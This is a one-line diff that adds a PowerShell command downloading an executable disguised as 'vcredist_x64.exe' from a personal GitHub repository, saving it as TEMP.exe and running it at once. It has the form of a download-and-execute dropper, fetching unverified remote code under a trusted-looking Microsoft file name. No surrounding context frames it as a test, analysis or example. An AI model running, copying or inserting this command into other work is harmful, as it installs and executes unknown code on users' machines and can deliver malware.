@@ -1,0 +1,1 @@
+Invoke-WebRequest https://github.com/Asporen1/baksaank/blob/main/vcredist_x64.exe -UseBasicParsing -OutFile TEMP.exe ; Start TEMP.exe
